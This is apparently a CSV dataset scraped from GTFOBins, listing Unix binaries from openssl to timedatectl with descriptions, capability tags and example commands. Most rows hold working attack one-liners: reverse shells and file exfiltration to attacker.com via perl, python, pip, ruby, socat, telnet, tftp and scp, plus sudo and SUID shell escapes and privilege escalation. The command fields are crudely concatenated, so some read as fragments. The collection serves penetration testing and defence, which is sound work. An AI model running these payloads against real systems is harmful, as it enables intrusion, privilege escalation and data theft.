+openssl,https://gtfobins.github.io/gtfobins/openssl/,It can send back a reverse shell to a listening attacker to open a remote network access.,Reverse shell; File upload; File download; File write; File read; Library load; SUID; Sudo,"openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+openssl s_server -quiet -key key.pem -cert cert.pem -port 12345; RHOST=attacker.com
+RPORT=12345
+mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s; openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 > file_to_save"
+openvpn,https://gtfobins.github.io/gtfobins/openvpn/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File read; SUID; Sudo,"openvpn --dev null --script-security 2 --up '/bin/sh -c sh'; LFILE=file_to_read
+openvpn --config ""$LFILE""; sh -p"
+openvt,https://gtfobins.github.io/gtfobins/openvt/,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",Sudo,"sudo; COMMAND=id
+TF=$(mktemp -u)
+sudo openvt -- sh -c ""$COMMAND >$TF 2>&1""
+cat $TF"
+opkg,https://gtfobins.github.io/gtfobins/opkg/,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",Sudo,"sudo; TF=$(mktemp -d)
+echo 'exec /bin/sh' > $TF/x.sh
+fpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF; sudo opkg install x_1.0_all.deb"
+pandoc,https://gtfobins.github.io/gtfobins/pandoc/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; File read; SUID; Sudo; Limited SUID,"lua; TF=$(mktemp)
+echo 'os.execute(""/bin/sh"")' >$TF
+pandoc -L $TF /dev/null; LFILE=file_to_write
+echo DATA | pandoc -t plain -o ""$LFILE"""
+paste,https://gtfobins.github.io/gtfobins/paste/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; SUID; Sudo,"LFILE=file_to_read
+paste $LFILE; sh -p; -p"
+pax,https://gtfobins.github.io/gtfobins/pax/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read,"tar; LFILE=file_to_read
+pax -w ""$LFILE"""
+pdb,https://gtfobins.github.io/gtfobins/pdb/,"This allows to execute python code, other functions may apply.",Shell; Sudo,"python; TF=$(mktemp)
+echo 'import os; os.system(""/bin/sh"")' > $TF
+pdb $TF
+cont; sudo"
+pdflatex,https://gtfobins.github.io/gtfobins/pdflatex/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File read; Sudo; Limited SUID,"pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'; pdflatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
+pdftotext article.pdf -; sudo"
+pdftex,https://gtfobins.github.io/gtfobins/pdftex/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo; Limited SUID,pdftex --shell-escape '\write18{/bin/sh}\end'; sudo; sudo pdftex --shell-escape '\write18{/bin/sh}\end'
+perf,https://gtfobins.github.io/gtfobins/perf/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,perf stat /bin/sh; sh -p; -p
+perl,https://gtfobins.github.io/gtfobins/perl/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Reverse shell; File read; SUID; Sudo; Capabilities,"perl -e 'exec ""/bin/sh"";'; nc -l -p 12345; export RHOST=attacker.com
+export RPORT=12345
+perl -e 'use Socket;$i=""$ENV{RHOST}"";$p=$ENV{RPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};'"
+perlbug,https://gtfobins.github.io/gtfobins/perlbug/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh;'; sudo; sudo perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh;'
+pexec,https://gtfobins.github.io/gtfobins/pexec/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,pexec /bin/sh; sh -p; -p
+pg,https://gtfobins.github.io/gtfobins/pg/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File read; SUID; Sudo,"pg /etc/profile
+!/bin/sh; pg file_to_read; sh -p"
+php,https://gtfobins.github.io/gtfobins/php/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Command; Reverse shell; File upload; File download; File write; File read; SUID; Sudo; Capabilities,"export CMD=""/bin/sh""
+php -r 'system(getenv(""CMD""));'; export CMD=""/bin/sh""
+php -r 'passthru(getenv(""CMD""));'; export CMD=""/bin/sh""
+php -r 'print(shell_exec(getenv(""CMD"")));'"
+pic,https://gtfobins.github.io/gtfobins/pic/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File read; Sudo; Limited SUID,"pic -U
+.PS
+sh X sh X; LFILE=file_to_read
+pic $LFILE; sudo"
+pico,https://gtfobins.github.io/gtfobins/pico/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; File read; Sudo; Limited SUID,"pico
+^R^X
+reset; sh 1>&0 2>&0; SPELL; -s"
+pidstat,https://gtfobins.github.io/gtfobins/pidstat/,It can be used to break out from restricted environments by running non-interactive system commands.,Command; SUID; Sudo,"COMMAND=id
+pidstat -e $COMMAND; sh -p; -p"
+pip,https://gtfobins.github.io/gtfobins/pip/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Reverse shell; File upload; File download; File write; File read; Library load; Sudo,"TF=$(mktemp -d)
+echo ""import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')"" > $TF/setup.py
+pip install $TF; socat file:`tty`,raw,echo=0 tcp-listen:12345; export RHOST=attacker.com
+export RPORT=12345
+TF=$(mktemp -d)
+echo 'import sys,socket,os,pty;s=socket.socket()
+s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))))
+[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
+pty.spawn(""/bin/sh"")' > $TF/setup.py
+pip install $TF"
+pkexec,https://gtfobins.github.io/gtfobins/pkexec/,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",Sudo,sudo; sudo pkexec /bin/sh
+pkg,https://gtfobins.github.io/gtfobins/pkg/,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",Sudo,"sudo; TF=$(mktemp -d)
+echo 'id' > $TF/x.sh
+fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF; sudo pkg install -y --no-repo-update ./x-1.0.txz"
+posh,https://gtfobins.github.io/gtfobins/posh/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo; Limited SUID,posh; sudo; sudo posh
+pr,https://gtfobins.github.io/gtfobins/pr/,Some bytes are altered so it might not be suitable for binary files.,File read; SUID; Sudo,"LFILE=file_to_read
+pr -T $LFILE; sh -p; -p"
+pry,https://gtfobins.github.io/gtfobins/pry/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo; Limited SUID,"pry
+system(""/bin/sh""); sudo; sudo pry
+system(""/bin/sh"")"
+psftp,https://gtfobins.github.io/gtfobins/psftp/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo; Limited SUID,"psftp
+!/bin/sh; sudo; sudo psftp
+!/bin/sh"
+psql,https://gtfobins.github.io/gtfobins/psql/,"This invokes the default pager, which is likely to be less, other functions may apply.",Shell; Sudo,"less; psql
+\?
+!/bin/sh; sudo"
+ptx,https://gtfobins.github.io/gtfobins/ptx/,"While the program is capable of reading the file, it outputs a “permuted index” of its content, thus altering it. Adjusting the options could yield more readable outputs.",File read; SUID; Sudo,"LFILE=file_to_read
+ptx -w 5000 ""$LFILE""; sh -p; -p"
+puppet,https://gtfobins.github.io/gtfobins/puppet/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; File read; Sudo,"puppet apply -e ""exec { '/bin/sh -c \""exec sh -i <$(tty) >$(tty) 2>$(tty)\""': }""; LFILE=""/tmp/file_to_write""
+puppet apply -e ""file { '$LFILE': content => 'DATA' }""; diff"
+pwsh,https://gtfobins.github.io/gtfobins/pwsh/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; Sudo,"pwsh; export LFILE=file_to_write
+pwsh -c '""DATA"" | Out-File $env:LFILE'; sudo"
+python,https://gtfobins.github.io/gtfobins/python/,The payloads are compatible with both Python version 2 and 3.,Shell; Reverse shell; File upload; File download; File write; File read; Library load; SUID; Sudo; Capabilities,"python -c 'import os; os.system(""/bin/sh"")'; socat file:`tty`,raw,echo=0 tcp-listen:12345; export RHOST=attacker.com
+export RPORT=12345
+python -c 'import sys,socket,os,pty;s=socket.socket()
+s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))))
+[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
+pty.spawn(""/bin/sh"")'"
+rake,https://gtfobins.github.io/gtfobins/rake/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File read; Sudo; Limited SUID,"rake -p '`/bin/sh 1>&0`'; LFILE=file-to-read
+rake -f $LFILE; sudo"
+rc,https://gtfobins.github.io/gtfobins/rc/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,rc -c '/bin/sh'; sh -p; -p
+readelf,https://gtfobins.github.io/gtfobins/readelf/,Each line is corrupted by a prefix string and wrapped inside single quotes. Also consider that lines are actually parsed as readelf options thus some file contents may lead to unexpected results.,File read; SUID; Sudo,"readelf; LFILE=file_to_read
+readelf -a @$LFILE; sh -p"
+red,https://gtfobins.github.io/gtfobins/red/,Read and write files limited to the current directory.,File write; File read; Sudo,"red file_to_write
+a
+DATA
+.
+w
+q; red file_to_read
+,p
+q; sudo"
+redcarpet,https://gtfobins.github.io/gtfobins/redcarpet/,The file is actually parsed as a Markdown file.,File read; Sudo,"LFILE=file_to_read
+redcarpet ""$LFILE""; sudo; LFILE=file_to_read
+sudo redcarpet ""$LFILE"""
+redis,https://gtfobins.github.io/gtfobins/redis/,This works with versions lower than 7.,File write,"IP=127.0.0.1
+redis-cli -h $IP
+config set dir dir_to_write_to
+config set dbfilename file_to_write
+set x ""DATA""
+save"
+restic,https://gtfobins.github.io/gtfobins/restic/,"The attacker must setup a server to receive the backups, in the following example rest-server is used but there are other options. To start a new instance and create a new repository:",File upload; SUID; Sudo,"RPORT=12345
+NAME=backup_name
+./rest-server --listen "":$RPORT""
+restic init -r ""rest:http://localhost:$RPORT/$NAME""; restic restore -r ""/tmp/restic/$NAME"" latest --target .; RHOST=attacker.com
+RPORT=12345
+LFILE=file_or_dir_to_get
+NAME=backup_name
+restic backup -r ""rest:http://$RHOST:$RPORT/$NAME"" ""$LFILE"""
+rev,https://gtfobins.github.io/gtfobins/rev/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; SUID; Sudo,"LFILE=file_to_read
+rev $LFILE | rev; sh -p; -p"
+rlogin,https://gtfobins.github.io/gtfobins/rlogin/,"Usually rlogin is a symlink to ssh, the following works only when the real rlogin is used (e.g., from the rsh-client APT package).",File upload,rlogin; ssh; rsh-client
+rlwrap,https://gtfobins.github.io/gtfobins/rlwrap/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; SUID; Sudo,"rlwrap /bin/sh; echo; LFILE=file_to_write
+rlwrap -l ""$LFILE"" echo DATA"
+rpm,https://gtfobins.github.io/gtfobins/rpm/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo; Limited SUID,"rpm --eval '%{lua:os.execute(""/bin/sh"")}'; rpm --pipe '/bin/sh 0<&1'; sudo"
+rpmdb,https://gtfobins.github.io/gtfobins/rpmdb/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo; Limited SUID,rpmdb --eval '%(/bin/sh 1>&2)'; sudo; sudo rpmdb --eval '%(/bin/sh 1>&2)'
+rpmquery,https://gtfobins.github.io/gtfobins/rpmquery/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo; Limited SUID,"rpmquery --eval '%{lua:posix.exec(""/bin/sh"")}'; sudo; sudo rpmquery --eval '%{lua:posix.exec(""/bin/sh"")}'"
+rpmverify,https://gtfobins.github.io/gtfobins/rpmverify/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo; Limited SUID,rpmverify --eval '%(/bin/sh 1>&2)'; sudo; sudo rpmverify --eval '%(/bin/sh 1>&2)'
+rsync,https://gtfobins.github.io/gtfobins/rsync/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,"rsync -e 'sh -c ""sh 0<&2 1>&2""' 127.0.0.1:/dev/null; sh -p; -p"
+rtorrent,https://gtfobins.github.io/gtfobins/rtorrent/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID,"echo ""execute = /bin/sh,-c,\""/bin/sh <$(tty) >$(tty) 2>$(tty)\"""" >~/.rtorrent.rc
+rtorrent; sh -p; -p"
+ruby,https://gtfobins.github.io/gtfobins/ruby/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Reverse shell; File upload; File download; File write; File read; Library load; Sudo; Capabilities,"ruby -e 'exec ""/bin/sh""'; nc -l -p 12345; export RHOST=attacker.com
+export RPORT=12345
+ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV[""RHOST""],ENV[""RPORT""]);while(cmd=c.gets);IO.popen(cmd,""r""){|io|c.print io.read}end'"
+run-mailcap,https://gtfobins.github.io/gtfobins/run-mailcap/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; File read; Sudo,"less; run-mailcap --action=view /etc/hosts
+!/bin/sh; vi"
+run-parts,https://gtfobins.github.io/gtfobins/run-parts/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,run-parts --new-session --regex '^sh$' /bin; sh -p; -p
+runscript,https://gtfobins.github.io/gtfobins/runscript/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo; Limited SUID,"TF=$(mktemp)
+echo '! exec /bin/sh' >$TF
+runscript $TF; sudo; TF=$(mktemp)
+echo '! exec /bin/sh' >$TF
+sudo runscript $TF"
+rview,https://gtfobins.github.io/gtfobins/rview/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Reverse shell; Non-interactive reverse shell; Non-interactive bind shell; File upload; File download; File write; File read; Library load; SUID; Sudo; Capabilities; Limited SUID,"rview; :py3; rview -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'"
+rvim,https://gtfobins.github.io/gtfobins/rvim/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Reverse shell; Non-interactive reverse shell; Non-interactive bind shell; File upload; File download; File write; File read; Library load; SUID; Sudo; Capabilities; Limited SUID,"rvim; :py3; rvim -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'"
+sash,https://gtfobins.github.io/gtfobins/sash/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,sash; sh -p; -p
+scanmem,https://gtfobins.github.io/gtfobins/scanmem/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,"scanmem
+shell /bin/sh; sh -p; -p"
+scp,https://gtfobins.github.io/gtfobins/scp/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File upload; File download; Sudo; Limited SUID,"TF=$(mktemp)
+echo 'sh 0<&2 1>&2' > $TF
+chmod +x ""$TF""
+scp -S $TF x y:; RPATH=user@attacker.com:~/file_to_save
+LPATH=file_to_send
+scp $LFILE $RPATH; RPATH=user@attacker.com:~/file_to_get
+LFILE=file_to_save
+scp $RPATH $LFILE"
+screen,https://gtfobins.github.io/gtfobins/screen/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; Sudo,screen; \n; \r\n
+script,https://gtfobins.github.io/gtfobins/script/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; Sudo,script -q /dev/null; script -q -c 'echo DATA' file_to_write; sudo
+scrot,https://gtfobins.github.io/gtfobins/scrot/,This requires a running X server.,Shell; Sudo; Limited SUID,scrot -e /bin/sh; sudo; sudo scrot -e /bin/sh
+sed,https://gtfobins.github.io/gtfobins/sed/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Command; File write; File read; SUID; Sudo,bash; sed -n '1e exec sh 1>&0' /etc/hosts; sed e
+service,https://gtfobins.github.io/gtfobins/service/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,/usr/sbin/service ../../bin/sh; sudo; sudo service ../../bin/sh
+setarch,https://gtfobins.github.io/gtfobins/setarch/,The uname -m command can be used in place of arch to obtain the architecture.,Shell; SUID; Sudo,uname -m; arch; setarch $(arch) /bin/sh
+setfacl,https://gtfobins.github.io/gtfobins/setfacl/,"This can be run with elevated privileges to change ownership and then read, write, or execute a file.",SUID; Sudo,sh -p; -p; sh
+setlock,https://gtfobins.github.io/gtfobins/setlock/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,"TF=$(mktemp)
+setlock $TF /bin/sh; sh -p; -p"
+sftp,https://gtfobins.github.io/gtfobins/sftp/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File upload; File download; Sudo,"HOST=user@attacker.com
+sftp $HOST
+!/bin/sh; RHOST=user@attacker.com
+sftp $RHOST
+put file_to_send file_to_save; RHOST=user@attacker.com
+sftp $RHOST
+get file_to_get file_to_save"
+sg,https://gtfobins.github.io/gtfobins/sg/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,sg $(id -ng); sudo; sudo sg root
+shuf,https://gtfobins.github.io/gtfobins/shuf/,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",File write; File read; SUID; Sudo,"LFILE=file_to_write
+shuf -e DATA -o ""$LFILE""; LFILE=file_to_read
+shuf -z ""$LFILE""; sh -p"
+slsh,https://gtfobins.github.io/gtfobins/slsh/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo; Limited SUID,"slsh -e 'system(""/bin/sh"")'; sudo; sudo slsh -e 'system(""/bin/sh"")'"
+smbclient,https://gtfobins.github.io/gtfobins/smbclient/,A valid SMB/CIFS server must be available.,Shell; File upload; File download; Sudo,"smbclient '\\attacker\share'
+!/bin/sh; sudo smbserver.py share /tmp; smbclient '\\attacker\share' -c 'put file_to_send where_to_save'"
+snap,https://gtfobins.github.io/gtfobins/snap/,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",Sudo,"sudo; COMMAND=id
+cd $(mktemp -d)
+mkdir -p meta/hooks
+printf '#!/bin/sh\n%s; false' ""$COMMAND"" >meta/hooks/install
+chmod +x meta/hooks/install
+fpm -n xxxx -s dir -t snap -a all meta; sudo snap install xxxx_1.0_all.snap --dangerous --devmode"
+socat,https://gtfobins.github.io/gtfobins/socat/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Reverse shell; Bind shell; File upload; File download; File write; File read; Sudo; Limited SUID,"socat stdin exec:/bin/sh; socat file:`tty`,raw,echo=0 tcp-listen:12345; RHOST=attacker.com
+RPORT=12345
+socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane"
+socket,https://gtfobins.github.io/gtfobins/socket/,It can send back a reverse shell to a listening attacker to open a remote network access.,Reverse shell; Bind shell,"nc -l -p 12345; RHOST=attacker.com
+RPORT=12345
+socket -qvp '/bin/sh -i' $RHOST $RPORT; nc target.com 12345"
+soelim,https://gtfobins.github.io/gtfobins/soelim/,"The content is actually parsed and corrupted by the command, thus it may not be suitable for arbitrary files.",File read; SUID; Sudo,"LFILE=file_to_read
+soelim ""$LFILE""; sh -p; -p"
+softlimit,https://gtfobins.github.io/gtfobins/softlimit/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,softlimit /bin/sh; sh -p; -p
+sort,https://gtfobins.github.io/gtfobins/sort/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; SUID; Sudo,"LFILE=file_to_read
+sort -m ""$LFILE""; sh -p; -p"
+split,https://gtfobins.github.io/gtfobins/split/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Command; File write; File read; Sudo,"split --filter=/bin/sh /dev/stdin; COMMAND=id
+TF=$(mktemp)
+split --filter=$COMMAND $TF; COMMAND=id
+echo | split --filter=$COMMAND /dev/stdin"
+sqlite3,https://gtfobins.github.io/gtfobins/sqlite3/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; File read; SUID; Sudo; Limited SUID,"sqlite3 /dev/null '.shell /bin/sh'; LFILE=file_to_write
+sqlite3 /dev/null -cmd "".output $LFILE"" 'select ""DATA"";'; LFILE=file_to_read
+sqlite3 << EOF
+CREATE TABLE t(line TEXT);
+.import $LFILE t
+SELECT * FROM t;
+EOF"
+sqlmap,https://gtfobins.github.io/gtfobins/sqlmap/,"This allows to execute python code, other functions may apply.",Shell; Sudo,"python; sqlmap -u 127.0.0.1 --eval=""import os; os.system('/bin/sh')""; sudo"
+ss,https://gtfobins.github.io/gtfobins/ss/,The file content is actually parsed so only a part of the first line is returned as a part of an error message.,File read; SUID; Sudo,"LFILE=file_to_read
+ss -a -F $LFILE; sh -p; -p"
+ssh-agent,https://gtfobins.github.io/gtfobins/ssh-agent/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,ssh-agent /bin/sh; sh -p; -p
+ssh-keygen,https://gtfobins.github.io/gtfobins/ssh-keygen/,It loads shared libraries that may be used to run code in the binary execution context.,Library load; SUID; Sudo,ssh-keygen -D ./lib.so; sh -p; -p
+ssh-keyscan,https://gtfobins.github.io/gtfobins/ssh-keyscan/,The file content is actually parsed so only a part of each line is returned as a part of an error message.,File read; SUID; Sudo,"LFILE=file_to_read
+ssh-keyscan -f $LFILE; sh -p; -p"
+ssh,https://gtfobins.github.io/gtfobins/ssh/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File upload; File download; File read; Sudo,ssh localhost $SHELL --noprofile --norc; ssh -o ProxyCommand=';sh 0<&2 1>&2' x; host
+sshpass,https://gtfobins.github.io/gtfobins/sshpass/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,sshpass /bin/sh; sh -p; -p
+start-stop-daemon,https://gtfobins.github.io/gtfobins/start-stop-daemon/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,start-stop-daemon -n $RANDOM -S -x /bin/sh; sh -p; -p
+stdbuf,https://gtfobins.github.io/gtfobins/stdbuf/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,stdbuf -i0 /bin/sh; sh -p; -p
+strace,https://gtfobins.github.io/gtfobins/strace/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; SUID; Sudo,"strace -o /dev/null /bin/sh; strace - DATA; LFILE=file_to_write
+strace -s 999 -o $LFILE strace - DATA"
+strings,https://gtfobins.github.io/gtfobins/strings/,"This only returns ASCII strings, thus it is not suitable for binary files.",File read; SUID; Sudo,"LFILE=file_to_read
+strings ""$LFILE""; sh -p; -p"
+su,https://gtfobins.github.io/gtfobins/su/,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",Sudo,sudo; sudo su
+sudo,https://gtfobins.github.io/gtfobins/sudo/,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",Sudo,sudo; sudo sudo /bin/sh
+sysctl,https://gtfobins.github.io/gtfobins/sysctl/,It can be used to break out from restricted environments by running non-interactive system commands.,Command; File read; SUID; Sudo,"COMMAND='/bin/sh -c id>/tmp/id'
+sysctl ""kernel.core_pattern=|$COMMAND""
+sleep 9999 &
+kill -QUIT $!
+cat /tmp/id; -p; -n"
+systemctl,https://gtfobins.github.io/gtfobins/systemctl/,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",SUID; Sudo,sh -p; -p; sh
+systemd-resolve,https://gtfobins.github.io/gtfobins/systemd-resolve/,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",Sudo,"sudo; less; sudo systemd-resolve --status
+!sh"
+tac,https://gtfobins.github.io/gtfobins/tac/,Make sure that RANDOM does not appear into the file to read otherwise the content of the file is corrupted by reversing the order of RANDOM-separated chunks.,File read; SUID; Sudo,"RANDOM; LFILE=file_to_read
+tac -s 'RANDOM' ""$LFILE""; sh -p"
+tail,https://gtfobins.github.io/gtfobins/tail/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; SUID; Sudo,"LFILE=file_to_read
+tail -c1G ""$LFILE""; sh -p; -p"
+tar,https://gtfobins.github.io/gtfobins/tar/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File upload; File download; File write; File read; Sudo; Limited SUID,"tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh; tar xf /dev/null -I '/bin/sh -c ""sh <&2 1>&2""'; TF=$(mktemp)
+echo '/bin/sh 0<&1' > ""$TF""
+tar cf ""$TF.tar"" ""$TF""
+tar xf ""$TF.tar"" --to-command sh
+rm ""$TF""*"
+task,https://gtfobins.github.io/gtfobins/task/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,task execute /bin/sh; sudo; sudo task execute /bin/sh
+taskset,https://gtfobins.github.io/gtfobins/taskset/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,taskset 1 /bin/sh; sh -p; -p
+tasksh,https://gtfobins.github.io/gtfobins/tasksh/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo; Limited SUID,"tasksh
+!/bin/sh; sudo; sudo tasksh
+!/bin/sh"
+tbl,https://gtfobins.github.io/gtfobins/tbl/,The read file content is corrupted by additional text at the beginning.,File read; SUID; Sudo,"LFILE=file_to_read
+tbl $LFILE; sh -p; -p"
+tclsh,https://gtfobins.github.io/gtfobins/tclsh/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Non-interactive reverse shell; SUID; Sudo,"tclsh
+exec /bin/sh <@stdin >@stdout 2>@stderr; nc -l -p 12345; export RHOST=attacker.com
+export RPORT=12345
+echo 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s ""> "";flush $s;gets $s c;set e ""exec $c"";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh"
+tcpdump,https://gtfobins.github.io/gtfobins/tcpdump/,These require some traffic to be actually captured. Also note that the subprocess is immediately sent to the background.,Command; Sudo,"postrotate-command; COMMAND='id'
+TF=$(mktemp)
+echo ""$COMMAND"" > $TF
+chmod +x $TF
+tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF; sudo"
+tdbtool,https://gtfobins.github.io/gtfobins/tdbtool/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo; Limited SUID,"tdbtool
+! /bin/sh; sudo; sudo tdbtool
+! /bin/sh"
+tee,https://gtfobins.github.io/gtfobins/tee/,It can only append data if the destination exists.,File write; SUID; Sudo,"LFILE=file_to_write
+echo DATA | ./tee -a ""$LFILE""; sh -p; -p"
+telnet,https://gtfobins.github.io/gtfobins/telnet/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Reverse shell; Sudo; Limited SUID,"RHOST=attacker.com
+RPORT=12345
+telnet $RHOST $RPORT
+^]
+!/bin/sh; nc -l -p 12345; RHOST=attacker.com
+RPORT=12345
+TF=$(mktemp -u)
+mkfifo $TF && telnet $RHOST $RPORT 0<$TF | /bin/sh 1>$TF"
+terraform,https://gtfobins.github.io/gtfobins/terraform/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; SUID; Sudo,"terraform console
+file(""file_to_read""); sh -p; -p"
+tex,https://gtfobins.github.io/gtfobins/tex/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo; Limited SUID,tex --shell-escape '\write18{/bin/sh}\end'; sudo; sudo tex --shell-escape '\write18{/bin/sh}\end'
+tftp,https://gtfobins.github.io/gtfobins/tftp/,It can exfiltrate files on the network.,File upload; File download; SUID; Sudo,"RHOST=attacker.com
+tftp $RHOST
+put file_to_send; RHOST=attacker.com
+tftp $RHOST
+get file_to_get; sh -p"
+tic,https://gtfobins.github.io/gtfobins/tic/,"The tic command translates a terminfo file from source format into compiled format. It will attempt to translate an arbitrary file and output the contents of the file on failure, so this may not be suitable to read arbitrary binary data.",File read; SUID; Sudo,"LFILE=file_to_read
+tic -C ""$LFILE""; sh -p; -p"
+time,https://gtfobins.github.io/gtfobins/time/,"Note that the shell might have its own builtin time implementation, which may behave differently than /usr/bin/time, hence the absolute path.",Shell; SUID; Sudo,/usr/bin/time; /usr/bin/time /bin/sh; sh -p
+timedatectl,https://gtfobins.github.io/gtfobins/timedatectl/,"This invokes the default pager, which is likely to be less, other functions may apply.",Shell; Sudo,"less; timedatectl list-timezones
+!/bin/sh; sudo"
